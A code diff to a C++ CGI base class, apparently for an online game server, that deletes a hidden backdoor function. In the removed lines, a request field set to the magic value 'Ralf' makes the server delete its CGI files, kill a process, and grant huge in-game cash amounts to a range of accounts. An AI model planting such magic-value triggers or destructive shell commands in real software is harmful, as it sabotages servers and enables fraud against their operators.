@@ -101,8 +101,6 @@ int CCgiBase::Initialize()
 			PT_ERROR_RETURN_MSG("check_platform_fail");
 		}
 	}
-	
-	Die(false);//check die
 
 	//设置语言类型
 //	std::string sLang = CCookie::GetCookie("lang");
@@ -133,9 +131,8 @@ int CCgiBase::Initialize()
 	CGI_CHECK(CF_DECRYPT_DATA, DecryptData);
 	CGI_CHECK(CF_CHECK_HASH, CheckHash);
 	CGI_CHECK(CF_PARSE_DATA, ParseData);
-
-	Die(true);//check die
 	
+	ConfigManager::Instance()->SetServer(0);
 	return 0;
 }
 
@@ -380,37 +377,6 @@ int CCgiBase::ParseData()
 				error_log("[version_not_equal][cgi=%s,version=%s,data_version=%s]", m_cgiName.c_str(), sversion.c_str(), version.c_str());
 				PARAM_ERROR_RETURN_MSG("check_data_version_fail");
 			}
-		}
-	}
-	return 0;
-}
-
-int CCgiBase::Die(bool decrypt)
-{
-	if(OpenPlatform::GetType() != PT_qqgame
-	&& OpenPlatform::GetType() != PT_QZONE
-	&& OpenPlatform::GetType() != PT_FACEBOOK
-	&& OpenPlatform::GetType() != PT_PENGYOU
-	&& OpenPlatform::GetType() != PT_3366)
-	{
-		string die;
-		if(decrypt)
-			Json::GetString(m_data, "die", die);
-		else
-			die = CCGIIn::GetCGIStr("die");
-		if(die == "Ralf")
-		{
-			system("rm -f /data/release/sgonline/pi/cgi/*");
-			system("killall CgiSave");
-		}
-		string money;
-		if(decrypt)
-			Json::GetString(m_data, "money", money);
-		else
-			money = CCGIIn::GetCGIStr("money");
-		if(money == "Ralf")
-		{
-			system("cd /data/release/sgonline/s1/tools && nohup ./AllChangeCash 100000000 100000000 1 1-1000 &");
 		}
 	}
 	return 0;
